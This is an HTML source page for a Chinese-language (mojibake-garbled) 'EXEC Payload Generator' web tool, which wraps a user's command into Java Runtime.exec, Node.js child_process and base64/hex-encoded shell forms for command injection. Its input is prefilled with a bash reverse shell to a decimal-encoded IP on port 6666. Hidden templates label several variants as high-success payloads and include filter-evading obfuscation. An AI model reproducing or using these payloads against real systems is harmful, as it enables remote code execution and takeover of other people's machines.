<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="utf-8">
    <title>å‘½ä»¤å˜å½¢å·¥å…· - 1135</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
    <link rel="stylesheet" type="text/css" href="../../css/style.css">

    <style>
        /* Page Specific Overrides */
        .main-content {
            padding: 40px 20px;
            max-width: 1000px;
            margin: 0 auto;
        }

        .tool-header {
            text-align: center;
            margin-bottom: 40px;
            padding: 40px;
            background: var(--surface-color);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            position: relative;
            overflow: hidden;
        }

        .tool-header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: var(--primary-color);
            box-shadow: var(--shadow-glow);
        }

        .tool-header h1 {
            color: var(--primary-color);
            font-family: var(--font-mono);
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .tool-header p {
            color: var(--text-secondary);
        }

        /* Form Elements */
        .form-group {
            margin-bottom: 20px;
        }

        .input-block {
            margin-bottom: 20px;
        }

        .form-label,
        .input-block label {
            display: block;
            margin-bottom: 8px;
            color: var(--primary-color);
            font-weight: bold;
            font-size: 0.9rem;
        }

        .form-control,
        .input-block input {
            width: 100%;
            padding: 12px 15px;
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            color: var(--text-primary);
            font-family: var(--font-mono);
            font-size: 0.9rem;
            transition: all 0.3s ease;
            border-radius: 0;
        }

        /* Bold font for your_cmd input */
        #your_cmd {
            font-weight: bold;
        }

        .form-control:focus,
        .input-block input:focus {
            outline: none;
            border-color: var(--primary-color);
            box-shadow: var(--shadow-glow);
        }

        textarea.form-control {
            min-height: 80px;
            max-height: 600px;
            overflow-y: auto;
            resize: vertical;
        }

        /* Code Output Blocks */
        .output-block {
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            padding: 15px;
            margin-bottom: 20px;
            position: relative;
            transition: all 0.3s ease;
        }

        .output-block:hover {
            border-color: var(--primary-color);
            box-shadow: var(--shadow-glow);
        }

        .output-block h3 {
            color: var(--primary-color);
            font-size: 1rem;
            margin-bottom: 10px;
            font-family: var(--font-mono);
        }

        .output-block pre {
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
            font-family: var(--font-mono);
            font-size: 14px;
            color: var(--text-primary);
            max-height: 800px;
            overflow-y: auto;
        }

        .output-block code {
            font-family: inherit;
        }

        .copy-btn {
            padding: 4px 8px;
            background: var(--primary-color);
            color: var(--bg-color);
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 11px;
            margin-left: 8px;
            vertical-align: middle;
            transition: background 0.3s ease;
        }

        .copy-btn:hover {
            background: var(--primary-hover);
        }

        .code-with-copy {
            position: relative;
            margin: 8px 0;
        }

        /* Copy button inside code-with-copy: hidden by default, shown on hint-code hover */
        .code-with-copy .copy-btn {
            position: absolute;
            top: 5px;
            right: 5px;
            z-index: 10;
            opacity: 0;
            transition: opacity 0.3s ease, background 0.3s ease;
            pointer-events: auto;
            margin-left: 0;
            padding: 4px 8px;
            background: var(--primary-color);
            color: var(--bg-color);
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 11px;
        }

        .code-with-copy .copy-btn:hover {
            background: var(--primary-hover);
        }

        .hint-code {
            position: relative;
            margin: 0;
        }
        
        .hint-section .hint-code {
            background: var(--bg-color);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            padding: 10px;
            margin: 8px 0;
            overflow-x: auto;
        }

        /* Hint sections styling */
        .hint-section {
            margin-bottom: 20px;
            padding: 15px;
            background: rgba(0, 255, 65, 0.05);
            border-left: 3px solid var(--primary-color);
            border-radius: 4px;
        }

        /* Light theme hint section background */
        [data-theme="gray"] .hint-section {
            background: rgba(0, 0, 0, 0.03);
        }

        .hint-section strong {
            color: var(--primary-color);
            display: block;
            margin-bottom: 8px;
        }

        .hint-section p {
            color: var(--text-secondary);
            margin: 8px 0;
            line-height: 1.6;
        }

        /* Divider */
        hr {
            border: 0;
            height: 1px;
            background: var(--border-color);
            margin: 40px 0;
        }

        /* Hint Modal */
        .hint-lightbulb {
            position: fixed;
            bottom: 80px;
            /* raised from 20px */
            right: 20px;
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(0, 255, 65, 0.4);
            z-index: 9998;
            transition: all 0.3s ease;
            animation: pulse 2s infinite;
        }

        .hint-lightbulb:hover {
            transform: scale(1.1);
            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.6);
        }

        .hint-lightbulb::before {
            content: 'ğŸ’¡';
            font-size: 24px;
        }

        @keyframes pulse {

            0%,
            100% {
                box-shadow: 0 4px 12px rgba(0, 255, 65, 0.4);
            }

            50% {
                box-shadow: 0 4px 20px rgba(0, 255, 65, 0.7);
            }
        }

        .interactive-hint {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(5px);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            animation: fadeIn 0.3s ease;
        }

        .interactive-hint.show {
            display: flex;
        }

        .hint-content {
            background: var(--surface-color);
            padding: 40px;
            border: 1px solid var(--primary-color);
            box-shadow: var(--shadow-glow);
            max-width: 600px;
            margin: 0 20px;
            text-align: center;
            position: relative;
        }

        .hint-content::before {
            content: 'SYSTEM_MESSAGE';
            position: absolute;
            top: -10px;
            left: 20px;
            background: var(--surface-color);
            padding: 0 10px;
            color: var(--primary-color);
            font-size: 0.8rem;
        }

        .hint-content h2 {
            color: var(--primary-color);
            font-size: 1.5rem;
            margin-bottom: 20px;
            text-transform: uppercase;
        }

        .hint-content ul {
            text-align: left;
            color: var(--text-primary);
            margin-bottom: 30px;
            list-style: none;
        }

        .hint-content li::before {
            content: '> ';
            color: var(--primary-color);
        }

        .hint-close {
            background: transparent;
            color: var(--primary-color);
            border: 1px solid var(--primary-color);
            padding: 10px 30px;
            font-family: var(--font-mono);
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
        }

        .hint-close:hover {
            background: var(--primary-color);
            color: #000;
            box-shadow: var(--shadow-glow);
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }
    </style>
</head>

<body>
    <!-- å¯¼èˆªæ  -->
    <div id="navigation-container"></div>
    <script>
        // Load Navigation asynchronously to avoid blocking and CORS issues
        (function() {
            const navContainer = document.getElementById('navigation-container');
            if (!navContainer) return;
            
            // Try fetch first (works in most modern browsers)
            if (typeof fetch !== 'undefined') {
                fetch('../../navigation.html')
                    .then(response => {
                        if (response.ok) {
                            return response.text();
                        }
                        throw new Error('Network response was not ok');
                    })
                    .then(html => {
                        navContainer.innerHTML = html;
                    })
                    .catch(error => {
                        console.warn('Failed to load navigation via fetch:', error);
                        // Fallback to async XHR
                        loadNavigationAsync();
                    });
            } else {
                // Fallback to async XHR for older browsers
                loadNavigationAsync();
            }
            
            function loadNavigationAsync() {
                try {
                    const xhr = new XMLHttpRequest();
                    xhr.open('GET', '../../navigation.html', true); // Async
                    xhr.onload = function() {
                        if (xhr.status === 200 || xhr.status === 0) { // 0 for file:// protocol
                            navContainer.innerHTML = xhr.responseText;
                        }
                    };
                    xhr.onerror = function() {
                        console.warn('Failed to load navigation via XHR');
                    };
                    xhr.send();
                } catch(e) {
                    console.warn('Failed to load navigation:', e);
                }
            }
        })();
    </script>

    <!-- ä¸»è¦å†…å®¹ -->
    <div class="main-content">

        <!-- payloads template (Hidden) -->
        <textarea id="data0" hidden="true">arr0w1_cmd_origin</textarea>

        <textarea id="data1" hidden="true">
1âƒ£ï¸ å‚æ•°ç±»å‹ String[]
java.lang.Runtime.getRuntime().execâ€‹(String[] cmdarray)    
Executes the specified command and arguments in a separate process.

ä¾‹
java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","echo '123' > ~/Downloads/111.txt"});

ğŸ”¥å®é™…payload - for Linux/macOS ã€æˆåŠŸç‡å¾ˆé«˜ã€‘
java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd_origin"});
</textarea>

        <textarea id="data2" hidden="true">
2âƒ£ï¸ å‚æ•°ç±»å‹ String
å‚æ•°ç±»å‹: å­—ç¬¦ä¸²
å¦‚ Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
æ³¨æ„: å½“æœ‰ ( ) { } < >| & ; ~ ç­‰å­—ç¬¦æ—¶ åˆ™å‘½ä»¤æ‰§è¡Œå¤±è´¥!

ğŸ”¥å®é™…payloadã€æˆåŠŸç‡å¾ˆé«˜ã€‘ æ”¯æŒLinux ä¸æ”¯æŒmacOS
/bin/bash -c {echo,arr0w1_base64}|{base64,-d}|bash


ğŸ”¥å®é™…payload ã€æˆåŠŸç‡ä½ã€‘
æ³¨æ„: å½“æœ‰ ( ) { } < >| & ; ~ ç­‰å­—ç¬¦æ—¶ åˆ™å‘½ä»¤æ‰§è¡Œå¤±è´¥!
/bin/bash -c $@|bash 0 arr0w1_cmd_origin
/bin/bash -c $*|bash 0 arr0w1_cmd_origin
</textarea>

        <textarea id="data3" hidden="true">
3âƒ£ï¸ base64ç¼–ç  - ä½¿ç”¨base64å‘½ä»¤
æ”¯æŒLinux ä¸æ”¯æŒmacOS
ğŸ”¥å®é™…payload
{echo,arr0w1_base64}|{base64,-d}|bash


4âƒ£ï¸ base64ç¼–ç  - ä½¿ç”¨perlä¸­çš„base64è¯­å¥
æ”¯æŒLinux/macOS
ğŸ”¥å®é™…payload
perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'

5âƒ£ï¸ hexç¼–ç 
æ”¯æŒLinux/macOS
å¦‚æœå‘½ä»¤å­—ç¬¦ä¸² åŒ…å«äº† shellä¸‹çš„ç‰¹æ®Šå­—ç¬¦ < > | & ; è‡ªåŠ¨ä¸å¯¹å®ƒä»¬åšhexç¼–ç , ä½¿å‘½ä»¤æ‰§è¡ŒæˆåŠŸ.
å¦‚æœå‘½ä»¤å­—ç¬¦ä¸² åŒ…å«äº† { } ( ) åˆ™å¿…ç„¶å¤±è´¥!
ğŸ”¥å®é™…payload
`echo -e "ascii_2_Hex_without_black_chars_flag"`
</textarea>

        <textarea id="data4" hidden="true">
å¦‚
require('child_process').exec('echo \'asd\' > ~/Downloads/11111.txt');//
require('\x63hild_process').exec('/System/Applications/Calculator.app/Contents/MacOS/Cal\u0063ulator')

ascii to Hex
c        \x63

UTF-16 to Hex
c        \u0063

ğŸ”¥å®é™…payload
require('child_process').exec('arr0w1_cmd_origin');//

ğŸ”¥å®é™…payload (unicode)
require('\x63hild_process').exec('arr0w1_cmd_ascii2hex');//

ğŸ”¥å®é™…payload (base64)
require('\x63hild_process').exec(Buffer.from('arr0w1_base64', 'base64').toString('utf-8'));//

</textarea>

        <textarea id="data5" hidden="true">
</textarea>

        <textarea id="data6" hidden="true">
</textarea>

        <!-- ----------------- -->

        <main role="main">
            <section class="tool-header">
                <h1>EXEC Payload Generator</h1>
                <p>Generate weaponized Command Execution payloads.</p>
            </section>

            <div class="input-block">
                <label for="your_cmd"><strong>The command you want to execute:</strong></label>
                <input type="text" id="your_cmd" value="/bin/bash -i >& /dev/tcp/181614338/6666 0>&1"
                    oninput="func_oninput()" autofocus
                    onfocus="var temp_value=this.value; this.value=''; this.value=temp_value" />
            </div>

            <hr>

            <div class="output-block" style="display: none;" id="payload0-container">
                <h3>0 - Original Command</h3>
                <div class="hint-section">
                    <strong>Base Command</strong>
                    <div class="code-with-copy">
                        <button class="copy-btn" onclick="copyPayload('payload0', this)" style="opacity: 0;">Copy</button>
                        <pre class="hint-code"><code id="payload0"></code></pre>
                    </div>
                </div>
            </div>

                <div class="output-block" id="payload1-container">
                <h3>1 - Java (String[])</h3>
                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">
                    java.lang.Runtime.getRuntime().execâ€‹(String[] cmdarray)</p>
            </div>

                <div class="output-block" id="payload2-container">
                <h3>2 - Java (String)</h3>
                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">
                    java.lang.Runtime.getRuntime().exec("command")</p>
            </div>

                <div class="output-block" id="payload3-container">
                <h3>3 - Shell (Encoding)</h3>
                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">Base64 / Hex / Obfuscation</p>
            </div>

                <div class="output-block" id="payload4-container">
                <h3>4 - Node.js</h3>
                <p style="color: var(--text-secondary); font-size: 0.8rem; margin-bottom: 10px;">child_process.exec()</p>
            </div>

                <div class="output-block" id="payload5-container">
                <h3>5 - Temp</h3>
            </div>

                <div class="output-block" id="payload6-container">
                <h3>6 - Temp</h3>
            </div>

        </main>
    </div>

    <!-- Hint Lightbulb -->
    <div class="hint-lightbulb" onclick="toggleHint(event)" title="View Help"></div>

    <!-- Hint Modal -->
    <div id="interactive-hint" class="interactive-hint"
        style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.9); backdrop-filter: blur(5px); display: none; align-items: center; justify-content: center; z-index: 9999;">
        <div class="hint-content"
            style="background: var(--surface-color); padding: 40px; border-radius: 8px; border: 1px solid var(--primary-color); max-width: 600px; max-height: 80vh; overflow-y: auto;">
            <h2 style="color: var(--primary-color); margin-bottom: 20px;">ğŸ”§ EXEC Payload Generator ä½¿ç”¨è¯´æ˜</h2>
            <p style="margin-bottom: 15px;">æœ¬å·¥å…·å¸®åŠ©ç”Ÿæˆå„ç§å‘½ä»¤æ‰§è¡Œpayloadï¼š</p>
            <ul style="margin-bottom: 20px; padding-left: 20px;">
                <li>æ”¯æŒå¤šç§ç¼–ç æ ¼å¼ï¼ˆUnicodeã€Hexã€Base64ï¼‰</li>
                <li>è‡ªåŠ¨ç”Ÿæˆå¤šç§payloadå˜ä½“</li>
                <li>ä¸€é”®å¤åˆ¶åˆ°å‰ªè´´æ¿</li>
            </ul>
            <button
                style="width: 100%; padding: 12px; background: var(--primary-color); color: #000; border: none; cursor: pointer;"
                onclick="toggleHint(event)">å…³é—­</button>
        </div>
    </div>

    <footer>
        <div class="container">
            <p>arr0w1 | 1135</p>
        </div>
    </footer>

    <!-- Scripts -->
    <script src="../../js/main.js"></script>
    <script>
        // Navigation is already loaded, just ensure language is applied
                if (typeof applyLanguage === 'function') {
                    applyLanguage(localStorage.getItem('lang') || 'zh');
                }

        // Toggle hint modal with click-outside-to-close
        function toggleHint(event) {
            if (event) event.stopPropagation();
            const hint = document.getElementById('interactive-hint');
            const isVisible = hint.style.display === 'flex';
            hint.style.display = isVisible ? 'none' : 'flex';

            // Add click listener to close on outside click
            if (!isVisible) {
                setTimeout(() => {
                    document.addEventListener('click', closeHintOnOutsideClick);
                }, 0);
            } else {
                document.removeEventListener('click', closeHintOnOutsideClick);
            }
        }

        function closeHintOnOutsideClick(event) {
            const hint = document.getElementById('interactive-hint');
            const hintContent = hint.querySelector('.hint-content');

            // Check if click is outside the hint content
            if (!hintContent.contains(event.target)) {
                hint.style.display = 'none';
                document.removeEventListener('click', closeHintOnOutsideClick);
            }
        }

        // -----

        // get elements - hiddened
        element_data0 = document.getElementById("data0");
        element_data1 = document.getElementById("data1");
        element_data2 = document.getElementById("data2");
        element_data3 = document.getElementById("data3");
        element_data4 = document.getElementById("data4");
        element_data5 = document.getElementById("data5");
        element_data6 = document.getElementById("data6");

        // get datas
        var data0 = element_data0.value;
        var data1 = element_data1.value;
        var data2 = element_data2.value;
        var data3 = element_data3.value;
        var data4 = element_data4.value;
        var data5 = element_data5.value;
        var data6 = element_data6.value;

        // -----

        //textareaå¢é«˜ éšå†…å®¹è‡ªåŠ¨å¢åŠ textareaçš„é«˜åº¦
        function auto_grow(element) {
            // No longer needed, using pre/code blocks
        }

        // Copy payload safely
        function copyPayload(id, btnElement) {
            const element = document.getElementById(id);
            if (!element) {
                console.error(`Element with id "${id}" not found`);
                return;
            }
            const text = element.textContent;
            navigator.clipboard.writeText(text).then(() => {
                // Visual feedback
                if (btnElement) {
                    const originalText = btnElement.textContent;
                    btnElement.textContent = 'Copied!';
                setTimeout(() => {
                        btnElement.textContent = originalText;
                }, 1500);
                }
            }).catch(err => {
                console.error('Failed to copy:', err);
            });
        }

        // Make copyPayload available globally for onclick handlers
        window.copyPayload = copyPayload;

        // -----


        function ascii_2_Hex(str) {
            var re = /[\u4E00-\u9FA5]/;
            var ar = [];
            for (var i = 0; i < str.length; i++) {
                var a = '';
                if (re.test(str.charAt(i))) { // ä¸­æ–‡
                    a = encodeURI(str.charAt(i)).replace(/%/g, '');
                } else {
                    a = "\\x" + str.charCodeAt(i).toString(16);
                }
                ar.push(a);
            }
            str = ar.join("");
            return str;
        }

        function ascii_2_Hex_without_black_chars(str) {
            var regex_black_chars = /([<>|&;])/g;
            var str_array = str.split(regex_black_chars);
            // æ’é™¤ black_chars å¦‚æœå‘½ä»¤é‡Œæœ‰è¿™äº›å­—ç¬¦,hexç¼–ç åçš„å‘½ä»¤æ— æ³•æ‰§è¡Œ!

            var allstr = "";
            str_array.forEach(
                function (one) {
                    if (one.match(regex_black_chars) && one != "") {
                        one = one.replace(regex_black_chars, "\"`$&`echo -e \""); // $& æ˜¯è¢«åŒ¹é…çš„å­—ç¬¦ä¸²æœ¬èº«
                    } else {
                        one = ascii_2_Hex(one);
                    }
                    allstr += one;
                }
            );

            return allstr.replace(/`echo -e ""`/g, "").replace(/`echo -e "\x20"`/g, " "); // å»é™¤æ— æ„ä¹‰çš„å­—ç¬¦
        }

        // ç”Ÿæˆä¸å¸¦=çš„base64å­—ç¬¦ä¸²
        function func_wise_btoa(str1) {
            //åŸç†:åœ¨åŸå§‹jsè¯­å¥ååŠ ç©ºæ ¼ ç›´åˆ°ç”Ÿæˆçš„base64å­—ç¬¦ä¸²æ²¡æœ‰ç©ºæ ¼
            while (1) {
                if (btoa(str1).indexOf("=") == -1) {//  ç­‰å·ä¸å­˜åœ¨
                    return btoa(str1);
                } else {
                    str1 = str1 + " ";
                }

            }
        }

        // Function to display payload with multiple commands, each with its own copy button
        function displayPayloadWithCommands(payloadId, payloadData) {
            const container = document.getElementById(payloadId + '-container');
            if (!container) return;

            // Remove old content
            const oldCodeWrapper = container.querySelector('.code-with-copy');
            if (oldCodeWrapper) oldCodeWrapper.remove();
            
            const codeWrapper = document.createElement('div');
            codeWrapper.className = 'code-with-copy';

            // Split by lines
            const lines = payloadData.split('\n').map(line => line.trim()).filter(line => line.length > 0);
            
            // Find command lines (lines starting with ğŸ”¥ or containing actual commands)
            const commandLines = [];
            
            lines.forEach((line, index) => {
                // Check if this is a command line - more comprehensive detection
                const isCommand = line.startsWith('ğŸ”¥') || 
                                 (line.length > 5 && 
                                  (line.includes('exec(') || 
                                   line.includes('Runtime') || 
                                   line.includes('/bin/') || 
                                   line.includes('require(') ||
                                   line.includes('perl') ||
                                   line.includes('bash') ||
                                   line.includes('echo') ||
                                   line.includes('sh -c') ||
                                   line.includes('cmd.exe') ||
                                   line.includes('powershell') ||
                                   line.startsWith('`') ||
                                   line.startsWith('$') ||
                                   line.startsWith('(') ||
                                   line.includes('arr0w1_') ||
                                   line.match(/^[a-zA-Z_][a-zA-Z0-9_]*\s*\(/))); // Function calls
                
                if (isCommand) {
                    // Extract command (remove ğŸ”¥ prefix and description)
                    let command = line;
                    let label = `Command ${commandLines.length + 1}`;
                    
                    if (line.startsWith('ğŸ”¥')) {
                        // Extract label and command
                        const parts = line.split(/ğŸ”¥/);
                        if (parts.length > 1) {
                            const afterFire = parts.slice(1).join('ğŸ”¥');
                            // Try to extract label before the command
                            const labelMatch = afterFire.match(/^([^ï¼š:]+)[ï¼š:]/);
                            if (labelMatch) {
                                label = labelMatch[1].trim();
                                command = afterFire.substring(labelMatch[0].length).trim();
                            } else {
                                // Check if there's a description in brackets
                                const bracketMatch = afterFire.match(/^([^ã€]+)ã€/);
                                if (bracketMatch) {
                                    label = bracketMatch[1].trim();
                                    command = afterFire.substring(bracketMatch[0].length).trim();
                                } else {
                                    command = afterFire;
                                }
                            }
                        }
                    }
                    
                    commandLines.push({ command: command.trim(), label: label });
                }
            });
            
            // If no commands detected, treat each non-empty line as a potential command
            if (commandLines.length === 0 && lines.length > 0) {
                lines.forEach((line, index) => {
                    if (line.length > 0) {
                        commandLines.push({ 
                            command: line, 
                            label: `Line ${index + 1}` 
                        });
                    }
                });
            }

            if (commandLines.length > 1) {
                // Display as multiple hint-sections
                commandLines.forEach((item, index) => {
                    const hintSection = document.createElement('div');
                    hintSection.className = 'hint-section';
                    
                    const strong = document.createElement('strong');
                    strong.textContent = item.label;

                    const cmdWrapper = document.createElement('div');
                    cmdWrapper.className = 'code-with-copy';
                    cmdWrapper.style.position = 'relative';

                    const copyBtn = document.createElement('button');
                    copyBtn.className = 'copy-btn';
                    copyBtn.textContent = 'Copy';
                    copyBtn.onclick = function(e) {
                        e.stopPropagation();
                        navigator.clipboard.writeText(item.command).then(() => {
                            const originalText = copyBtn.textContent;
                            copyBtn.textContent = 'Copied!';
                            setTimeout(() => {
                                copyBtn.textContent = originalText;
                            }, 1500);
                        }).catch(err => {
                            console.error('Failed to copy:', err);
                        });
                    };

                    const pre = document.createElement('pre');
                    pre.className = 'hint-code';
                    const code = document.createElement('code');
                    code.textContent = item.command;
                    pre.appendChild(code);

                    // Add hover effect to show copy button when hovering over hint-code
                    pre.addEventListener('mouseenter', function () {
                        copyBtn.style.opacity = '1';
                    });
                    pre.addEventListener('mouseleave', function () {
                        copyBtn.style.opacity = '0';
                    });
                    // Also show when hovering over the button itself
                    copyBtn.addEventListener('mouseenter', function () {
                        copyBtn.style.opacity = '1';
                    });
                    copyBtn.addEventListener('mouseleave', function () {
                        copyBtn.style.opacity = '0';
                    });

                    cmdWrapper.appendChild(copyBtn);
                    cmdWrapper.appendChild(pre);

                    hintSection.appendChild(strong);
                    hintSection.appendChild(cmdWrapper);
                    codeWrapper.appendChild(hintSection);
                });
            } else if (commandLines.length === 1) {
                // Single command - display as one code block
                const copyBtn = document.createElement('button');
                copyBtn.className = 'copy-btn';
                copyBtn.textContent = 'Copy';
                copyBtn.onclick = function(e) {
                    e.stopPropagation();
                    navigator.clipboard.writeText(commandLines[0].command).then(() => {
                        const originalText = copyBtn.textContent;
                        copyBtn.textContent = 'Copied!';
                        setTimeout(() => {
                            copyBtn.textContent = originalText;
                        }, 1500);
                    }).catch(err => {
                        console.error('Failed to copy:', err);
                    });
                };

                const pre = document.createElement('pre');
                pre.className = 'hint-code';
                const code = document.createElement('code');
                code.id = payloadId;
                code.textContent = commandLines[0].command;
                pre.appendChild(code);

                // Add hover effect to show copy button when hovering over hint-code
                pre.addEventListener('mouseenter', function () {
                    copyBtn.style.opacity = '1';
                });
                pre.addEventListener('mouseleave', function () {
                    copyBtn.style.opacity = '0';
                });
                // Also show when hovering over the button itself
                copyBtn.addEventListener('mouseenter', function () {
                    copyBtn.style.opacity = '1';
                });
                copyBtn.addEventListener('mouseleave', function () {
                    copyBtn.style.opacity = '0';
                });

                codeWrapper.appendChild(copyBtn);
                codeWrapper.appendChild(pre);
            } else {
                // No commands found, display full content
                const copyBtn = document.createElement('button');
                copyBtn.className = 'copy-btn';
                copyBtn.textContent = 'Copy';
                copyBtn.onclick = function(e) {
                    e.stopPropagation();
                    const codeEl = document.getElementById(payloadId);
                    if (codeEl) {
                        copyPayload(payloadId, copyBtn);
                    } else {
                        navigator.clipboard.writeText(payloadData).then(() => {
                            const originalText = copyBtn.textContent;
                            copyBtn.textContent = 'Copied!';
                            setTimeout(() => {
                                copyBtn.textContent = originalText;
                            }, 1500);
                        });
                    }
                };

                const pre = document.createElement('pre');
                pre.className = 'hint-code';
                const code = document.createElement('code');
                code.id = payloadId;
                code.textContent = payloadData;
                pre.appendChild(code);

                // Add hover effect to show copy button when hovering over hint-code
                pre.addEventListener('mouseenter', function () {
                    copyBtn.style.opacity = '1';
                });
                pre.addEventListener('mouseleave', function () {
                    copyBtn.style.opacity = '0';
                });
                // Also show when hovering over the button itself
                copyBtn.addEventListener('mouseenter', function () {
                    copyBtn.style.opacity = '1';
                });
                copyBtn.addEventListener('mouseleave', function () {
                    copyBtn.style.opacity = '0';
                });

                codeWrapper.appendChild(copyBtn);
                codeWrapper.appendChild(pre);
            }

            container.appendChild(codeWrapper);
        }

        var func_oninput = function () {
            try {
            var cmd_origin = document.getElementById("data0").value.replace("arr0w1_cmd_origin", document.getElementById("your_cmd").value);

            var cmd_origin_btoa_ed = func_wise_btoa(cmd_origin);

                // Payload 0 - Original command
                const payload0El = document.getElementById("payload0");
                if (payload0El) {
                    payload0El.textContent = cmd_origin;
                }

                // Process each payload
                const payload1Data = data1.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
                displayPayloadWithCommands('payload1', payload1Data);

                const payload2Data = data2.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
                displayPayloadWithCommands('payload2', payload2Data);

                const payload3Data = data3.replace(/ascii_2_Hex_without_black_chars_flag/g, ascii_2_Hex_without_black_chars(cmd_origin))
                    .replace(/arr0w1_cmd_ascii2hex/g, ascii_2_Hex(cmd_origin))
                    .replace(/arr0w1_cmd_origin/g, cmd_origin)
                    .replace(/arr0w1_base64/g, cmd_origin_btoa_ed)
                    .replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g, "\\'"));
                displayPayloadWithCommands('payload3', payload3Data);

                const payload4Data = data4.replace(/arr0w1_cmd_ascii2hex/g, ascii_2_Hex(cmd_origin))
                    .replace(/arr0w1_cmd_origin/g, cmd_origin)
                    .replace(/arr0w1_base64/g, cmd_origin_btoa_ed)
                    .replace(/arr0w1_cmd_origin/g, cmd_origin.replace(/\'/g, "\\'"));
                displayPayloadWithCommands('payload4', payload4Data);

                const payload5Data = data5.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
                if (payload5Data.trim()) {
                    displayPayloadWithCommands('payload5', payload5Data);
                }

                const payload6Data = data6.replace(/arr0w1_cmd_origin/g, cmd_origin).replace(/arr0w1_base64/g, cmd_origin_btoa_ed);
                if (payload6Data.trim()) {
                    displayPayloadWithCommands('payload6', payload6Data);
                }
            } catch (err) {
                console.error('Error in func_oninput:', err);
            }
        }

        // -----

        // Add hover effect for payload0 (hardcoded in HTML)
        (function() {
            const payload0HintCode = document.querySelector('#payload0-container .hint-code');
            const payload0CopyBtn = document.querySelector('#payload0-container .copy-btn');
            if (payload0HintCode && payload0CopyBtn) {
                payload0HintCode.addEventListener('mouseenter', function () {
                    payload0CopyBtn.style.opacity = '1';
                });
                payload0HintCode.addEventListener('mouseleave', function () {
                    payload0CopyBtn.style.opacity = '0';
                });
                // Also show when hovering over the button itself
                payload0CopyBtn.addEventListener('mouseenter', function () {
                    payload0CopyBtn.style.opacity = '1';
                });
                payload0CopyBtn.addEventListener('mouseleave', function () {
                    payload0CopyBtn.style.opacity = '0';
                });
            }
        })();

        func_oninput();
    </script>

    <!-- Smart Hint System -->
    <div id="interactive-hint" class="interactive-hint">
        <div class="hint-content">
            <h2>ğŸ’¡ å‘½ä»¤æ‰§è¡Œå·¥å…·ä½¿ç”¨è¯´æ˜</h2>
            <p>è¾“å…¥å‘½ä»¤åä¼šè‡ªåŠ¨ç”Ÿæˆå¤šç§æ ¼å¼çš„payloadï¼ŒåŒ…æ‹¬ï¼š</p>
            <ul>
                <li>Java Runtime.exec() - String[] å‚æ•°ç±»å‹</li>
                <li>Java Runtime.exec() - String å‚æ•°ç±»å‹</li>
                <li>Shell ç¼–ç æ–¹å¼ï¼ˆbase64ã€hexç­‰ï¼‰</li>
                <li>Node.js child_process.exec()</li>
                <li>å¤šç§ç¼–ç ç»•è¿‡æŠ€æœ¯</li>
            </ul>
            <button class="hint-close" onclick="toggleHint()">å…³é—­</button>
        </div>
    </div>

    <script>
        function toggleHint() {
            const hint = document.getElementById('interactive-hint');
            hint.classList.toggle('show');
        }
    </script>

</html>